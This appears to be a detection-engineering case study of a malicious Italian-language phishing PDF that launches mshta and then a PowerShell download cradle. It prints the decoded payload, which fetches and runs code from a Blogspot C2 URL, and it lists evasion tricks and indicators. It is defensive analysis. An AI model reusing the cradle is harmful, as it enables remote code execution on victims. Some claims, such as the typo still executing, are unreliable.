# Case Study: mshta Italian Social Engineering → PowerShell Download Cradle

**Fixture**: `crates/sis-pdf-core/tests/fixtures/corpus_captured/mshta-italian-sandbox-escape-ef6dff9b.pdf`
**SHA256**: `ef6dff9b48f9cc08ab6325b728e40f0444a9d1650d228a770105d601cc66c253`
**Classification**: Malicious | SandboxEscape + DataExfiltration + Phishing

---

## Threat Summary

A multi-stage PDF attack combining Italian-language social engineering with a complete mshta-to-PowerShell execution chain. The PDF opens with a JavaScript alert prompting the victim to "open it in the browser" (Italian: "Lettore non compatibile! Per favore, aprilo nel browser."), then automatically launches `mshta` via a `/Launch` action with a `javascript:` URL scheme. The mshta process executes a PowerShell command that disables certificate checks (TLS 1.2 pinning bypass) and downloads a second-stage payload from a Blogspot C2 URL using `Invoke-Expression`. A netlify.app decoy annotation URL provides a secondary phishing path. This sample is part of the same campaign as `booking-js-phishing-379b41e3.pdf` (identical Italian alert lure).

---

## File Structure

- **Trailers**: 1; **XRef sections**: 1; **Revisions**: 1; **Detached objects**: 3
- **Objects**: 17 total (18 declared, 1 discrepancy)
- **ObjStm**: 1 object stream containing 10 objects (including the launch action)
- **Key structure**: Compact ObjStm design — entire attack chain is packed into 10 hidden objects

Key objects:
- Object 9 0: `/Action` dict with `/JS` key — Italian alert JavaScript
- Object 13 0: Launch action target (the mshta payload)
- Object 4 0: Annotation action → bookinq.netlify.app URI
- Object 2 0: OpenAction pointing to object 13 0
- Object 17 0: ObjStm (10 embedded objects)

---

## Detection Chain

**Stage 1 — Social engineering layer**:
- `js_intent_user_interaction` (High/Strong) — `app.alert("Lettore non compatibile! Per favore, aprilo nel browser.")`
- `js_present` (Medium/Strong) — AST-parsed, intent=user_interaction, no obfuscation
- `js_sandbox_exec` (Info/Tentative) — only fires in `pdf_reader:adobe:11:compat` profile (not browser profiles), confirming reader-specific trigger

**Stage 2 — Automatic execution trigger**:
- `action_automatic_trigger` (High/Strong) — `/OpenAction` on document open
- `open_action_present` (Low/Strong) — OpenAction → object 13 0
- `aa_event_present` (Medium/Probable) x2 — `/JS` and `/S` additional action events

**Stage 3 — mshta sandbox escape**:
- `launch_action_present` (High/Strong) — `/S /Launch` with target=mshta, initiation=automatic
- `launch_external_program` (High/Strong) — mshta launched with `javascript:` URL scheme
- `powershell_payload_present` (Low/Probable) — PowerShell indicators in object 17 0 stream

**Stage 4 — C2 exfiltration/download**:
- `passive_external_resource_fetch` (Medium/Strong) — external fetch target found in rendering-related objects
- `annotation_action_chain` (High/Strong) — URI target: `https://bookinq.netlify.app/#invoice-1619232149.pdf`

**Composite**:
- `composite.graph_evasion_with_execute` (High/Probable) — evasion indicators co-located with executable surfaces
- `renderer_behavior_divergence_known_path` (High/Strong) — known divergence path across action/script surfaces
- Intent `SandboxEscape`: score=8 Strong — OpenAction(1) + Launch(3) + JS+Launch(2) + AutoRun+JS(1) + event-to-launch path(1)

**Full decoded payload** (mshta `javascript:` parameter, object 13 0 /P):
```
"javascript:var abc=['Shell.Application','SHELLEXECUTE','powershell',
'-ep Bypass -c [Net.ServicePointManager]::SecuriptyProtocol =
[Net.SecurityProtocolType]::Tls12; Invoke-Expression
(IrM https://hotelmay21.blogspot.com////phudi.pdf); Start-Sleep -Seconds 9',
'','open',0],
ghi=new ActiveXObject(abc[0]);ghi[abc[1]](abc[2],abc[3],abc[4],abc[5],abc[6]);close();"
```

---

## Evasion Techniques

1. **ObjStm packing**: The entire attack payload (10 objects including the launch action) is hidden in a compressed object stream, making direct stream extraction difficult.
2. **`javascript:` URL scheme**: Using `mshta javascript:...` instead of a `.hta` file avoids file-based detections; the payload lives in the PDF's action dictionary.
3. **ActiveXObject indirection**: PowerShell is launched via `Shell.Application.SHELLEXECUTE` rather than directly, adding one layer of indirection to API call signatures.
4. **TLS 1.2 forced**: The `[Net.SecurityProtocolType]::Tls12` assignment ensures the download works on older systems while bypassing security tools that proxy only TLS 1.3 traffic.
5. **Blogspot C2**: Using `hotelmay21.blogspot.com` (a legitimate Google subdomain) for the C2 evades domain-reputation block lists. The `////phudi.pdf` path obfuscates the payload extension.
6. **Typo in PowerShell command**: `SecuriptyProtocol` (typo for `SecurityProtocol`) — likely intentional as this particular misspelling still executes correctly but breaks exact-match detection rules.
7. **Netlify decoy annotation**: A visible bookinq.netlify.app link gives document legitimacy (fake invoice URL) while the real attack proceeds via the launch action.
8. **Italian-language lure**: `app.alert` in Italian targets Italian-speaking victims and avoids English-language keyword detectors.
9. **`Start-Sleep -Seconds 9`**: Sleep delay frustrates sandbox timing-based analysis.

---

## Key Indicators

| Indicator | Type | Value |
|---|---|---|
| C2 URL | Domain | `hotelmay21.blogspot.com` |
| C2 path | URL path | `////phudi.pdf` |
| Decoy URL | Domain | `bookinq.netlify.app` |
| Launch target | Binary | `mshta` |
| PS invoke | String | `-ep Bypass -c Invoke-Expression (IrM ...)` |
| Social engineering | Language | Italian (lure alert) |
| Sleep | Evasion | `Start-Sleep -Seconds 9` |
| ObjStm | Structure | 10 objects hidden in compressed stream |

---

## Regression Coverage

- `mshta_italian_sandbox_escape_detections_present` — asserts:
  - `launch_action_present` at High severity with `launch.target_path == "mshta"`
  - `launch_external_program` at High severity
  - `powershell_payload_present` present
  - `js_intent_user_interaction` at High severity
  - `SandboxEscape` intent bucket fires at score >= 6
  - Verdict is Malicious

---

## Chain Assessment

The top chain "Automatic action trigger -> OpenAction -> action [launch_target] (13 0)" (score=0.95, completeness=0.4, 1 edge) captures the OpenAction→Launch link but stops there. The "Launch action present -> mshta" chain (score=0.95, completeness=0.2, 5 edges) captures the mshta surface. However, no single chain represents the full kill path:

**Expected end-to-end chain**:
`OpenAction` → `JS social engineering alert` → `Launch(mshta)` → `PowerShell -ep Bypass` → `IEX(IrM blogspot.com/phudi.pdf)`

**Gaps**:
1. `powershell_payload_present` is a separate singleton chain (score 0.9, 0 edges) — not linked to launch
2. The C2 URL (`hotelmay21.blogspot.com`) is not extracted into a `uri_action` or `external_resource` finding
3. The ObjStm that hosts the payload is not referenced as an evasion stage in the chain
4. `js_intent_user_interaction` (the lure) is not linked to the launch action as a social-engineering precondition

These gaps are documented in `plans/20260228-corpus-analysis-uplift.md`.
